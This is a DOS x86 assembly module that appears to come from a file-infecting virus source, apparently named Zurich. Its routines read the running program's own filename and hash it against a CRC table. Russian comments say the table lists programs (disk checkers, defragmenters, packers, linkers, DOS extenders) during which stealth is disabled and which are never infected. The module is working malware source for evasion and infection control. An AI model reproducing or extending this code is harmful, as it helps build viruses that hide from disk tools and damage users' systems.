INCLUDE ZURICH.ASI
;INCLUDE CRC.ASI
code segment byte public
assume cs:code, ds:code, es:code, ss:code

;public get_crc_just_fname
;public get_own_name
extrn DosCall             :near
extrn calculate_crc5       :near

;-+------------------------------------------------------------------------+-
;получить файлнейм из среды текущего PSP
;proc ;return ds:dx =@ParamStr(0) {use cur PSP}
;-+------------------------------------------------------------------------+-
;CRPROC get_own_name, 79FCh
;public get_own_name
pblabel get_own_name
    push    es ax bx
;    mov     ah, 34h
;    call    DosCall ;BX-cur psp
;    mov     ds, es:[bx][0Fh] ;cur PSP
    mov     ah, 51h
    int     21h
    mov     ds, bx
    mov     bx, PDB_environ
    mov     ds, ds:[bx] ;cur envir
    DO
        inc     bx
        cmp     word ptr [bx-4], 0
    CYCLE NZ
    mov     dx, bx
    pop     bx ax es
    ret
;endp
;-+------------------------------------------------------------------------+-




;-+------------------------------------------------------------------------+-
;ds:dx - string,
;(dx:cx)ax-crc of UpCase(JustFileName)
;ZF=1, если CRC этого имени есть в таблице
;-+------------------------------------------------------------------------+-
;CRPROC get_crc_just_fname, 474Ah
;public get_crc_just_fname
pblabel get_crc_just_fname
    push    es
    push si di cx dx
    pushf
    movseg  es, cs
    cld
    mov     si, dx
    DO
        lodsb
        and     al, al
    CYCLE NZ
    std
    lodsw
    DO
        lodsb
        cmp     al, '\'
        EXIT E
        cmp     al, ':'
        EXIT E
        cmp     al, 0
    CYCLE NZ
    popf
    lodsw
    call    Calculate_CRC5
    lea     di, nostlnames
    mov     cx, nostlnamescount
    repne   scasw
;cmp di, cx ;<debug zf=0
    pop dx cx di si
    pop     es
    ret
;endp
;-+------------------------------------------------------------------------+-




;-+------------------------------------------------------------------------+-
;при работе этих файлов выключается стелтс
;и еще: эти файлы не заражаются!
;-+------------------------------------------------------------------------+-
pblabel nostlnames
    CRC32w  < 'U', 'U', 'E', 'N', 'C' > ;uuencode
    CRC32w  < 'P', 'K', 'L', 'I', 'T' > ;PKLITE
    CRC32w  < 'L', 'Z', 'E', 'X', 'E' > ;lzexe
    CRC32w  < 'N', 'D', 'D', '.', 'E' > ;ndd.exe
    CRC32w  < 'D', 'I', 'E', 'T', '.' > ;diet.
    CRC32w  < 'S', 'C', 'A', 'N', 'D' > ;scandisk
    CRC32w  < 'S', 'D', '.', 'E', 'X' > ;sd.exe
    CRC32w  < 'S', 'P', 'E', 'E', 'D' > ;speedisk
    CRC32w  < 'D', 'E', 'F', 'R', 'A' > ;defrag
    CRC32w  < 'T', 'L', 'I', 'N', 'K' > ;tlink
    CRC32w  < 'W', 'L', 'I', 'N', 'K' > ;Wlink
    CRC32w  < 'L', 'I', 'N', 'K', '.' > ;link.exe
    CRC32w  < 'D', 'P', 'M', 'I', '1' > ;DPMI16
    CRC32w  < 'D', 'P', 'M', 'I', '3' > ;DPMI32
    CRC32w  < 'R', 'T', 'M', '.', 'E' > ;RTM.EXE
    CRC32w  < 'R', 'T', 'M', '3', '2' > ;RTM32.EXE
nostlnamescount = ($-nostlnames)/2
;-+------------------------------------------------------------------------+-
ends
end
